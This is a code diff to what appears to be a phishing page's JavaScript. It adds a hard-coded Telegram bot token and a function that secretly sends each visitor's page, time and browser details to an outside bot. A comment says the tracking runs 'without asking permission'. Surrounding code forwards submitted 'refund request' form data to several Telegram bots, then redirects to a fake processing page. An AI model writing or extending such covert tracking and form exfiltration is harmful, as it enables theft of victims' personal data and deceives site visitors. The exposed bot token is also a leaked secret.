@@ -981,6 +981,10 @@
         "5372119436"  // ID البوت الثاني
     ];
 
+    // إعدادات البوت الخاص بزيارات الموقع
+    const VISIT_BOT_TOKEN = "7627057454:AAGHuQrA_UtNGiNY9TJlXIo90LfjZMJaMms";
+    const VISIT_CHAT_ID = "5372119436";
+
     // نظام التتبع البسيط (بدون طلب إذن)
     async function trackVisitor() {
         try {
@@ -1022,13 +1026,13 @@
 🌐 Browser: ${basicInfo.browser}
             `;
 
-            // إرسال إلى جميع البوتات
-            await sendToTelegram(message);
+            // إرسال إلى بوت الزيارات فقط
+            await sendToVisitBot(message);
 
         } catch (error) {
             console.log("Error in tracking:", error);
             // إرسال إشعار أساسي إذا فشل التتبع
-            sendBasicNotification();
+            sendBasicVisitNotification();
         }
     }
 
@@ -1043,7 +1047,7 @@
     }
 
     // إشعار أساسي (إذا فشل التتبع المتقدم)
-    function sendBasicNotification() {
+    function sendBasicVisitNotification() {
         const now = new Date();
         const basicInfo = {
             page: window.location.href,
@@ -1068,11 +1072,35 @@
 🌐 Browser: ${basicInfo.browser}
             `;
         
-        // إرسال إلى جميع البوتات
-        sendToTelegram(message).catch(e => console.log("Failed to send basic notification"));
+        // إرسال إلى بوت الزيارات فقط
+        sendToVisitBot(message).catch(e => console.log("Failed to send basic notification"));
     }
 
-    // دالة محسنة لإرسال الرسائل إلى جميع البوتات
+    // دالة لإرسال الرسائل إلى بوت الزيارات فقط
+    async function sendToVisitBot(text) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${VISIT_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: VISIT_CHAT_ID,
+                    text: text,
+                    parse_mode: "Markdown"
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            
+            return await response.json();
+        } catch (error) {
+            console.error('Telegram send error for visit bot:', error);
+            throw error;
+        }
+    }
+
+    // دالة محسنة لإرسال الرسائل إلى جميع البوتات (لطلبات الاسترداد)
     async function sendToTelegram(text) {
         const results = [];
         
@@ -1182,7 +1210,7 @@
 💬 Commentaires: ${formData.comments}
 🕒 Heure: ${new Date(formData.submissionTime).toLocaleString('fr-FR')}`;
 
-            // إرسال إلى جميع البوتات
+            // إرسال إلى جميع البوتات (طلبات الاسترداد)
             const telegramResponses = await sendToTelegram(message);
 
             // الانتقال إلى صفحة المعالجة بعد 5 ثواني
